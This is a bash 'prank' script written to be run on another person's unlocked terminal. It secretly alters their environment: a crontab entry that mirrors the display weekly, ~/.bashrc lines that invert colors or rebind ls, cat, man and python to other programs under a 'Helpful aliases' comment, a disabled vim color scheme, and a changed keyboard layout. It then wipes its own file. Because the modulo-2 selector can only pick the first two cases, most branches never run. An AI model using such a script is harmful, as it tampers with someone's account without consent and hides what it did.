#!/bin/bash
#############################
#        Prank file         #
#   by Sebastian Paaske     #
# ######################### #
# That'll teach ya to lock  #
#      your terminal.       #
# ######################### #
#   http://prank.coq.dk     #
#############################

RANDOM=`date '+%s'`

case $[$RANDOM % 2] in
    0) # Mirror the display weekly
        crontab -l | sed '$a\@weekly /usr/bin/xrandr --display $DISPLAY --reflect xy' | crontab -
        ;;
    1) # Mirror the display now
        xrandr --display $DISPLAY --reflect xy
        ;;
    2) # Mirror the display every time a bash shell is started
        echo 'xrandr --display $DISPLAY --reflect xy' >> ~/.bashrc
        ;;
    3) # Remove VIM colors
        echo '" Improve color scheme' >> ~/.vimrc
        echo 'set t_Co=0' >> ~/.vimrc
        ;;
    4) # Screw up aliases
        echo '# Helpful aliases' >> ~/.bashrc
        echo "alias ls=`which ln`" >> ~/.bashrc
        echo "alias ln=`which man`" >> ~/.bashrc
        echo "alias man=`which cat`" >> ~/.bashrc
        echo "alias cat=`which vim`" >> ~/.bashrc
        echo "alias python=`which perl`" >> ~/.bashrc
        ;;
    5) # Invert colors now
        xcalib -invert -alter
        ;;
    6) # Invert colors whenever a shell is started
        echo 'xcalib -invert -alter' >> ~/.bashrc
        ;;
    7) # Invert colors a lot on ls
        echo "alias ls='while true; do xcalib -invert -alter; sleep 0.2; done'" >> ~/.bashrc
        ;;
    8) # Set keyboard layout to dvorak
        setxkbmap dvorak
        ;;
    9) # Set keyboard layout to colemak
        setxkbmap colemak
        ;;
    10) # Set keyboard layout to turkish
        setxkbmap tr
        ;;
esac

clear
echo "Hello there. Nice to meet you."
echo "You might want to remember to lock your screen next time."

# Clear the script
echo '' > "$0"
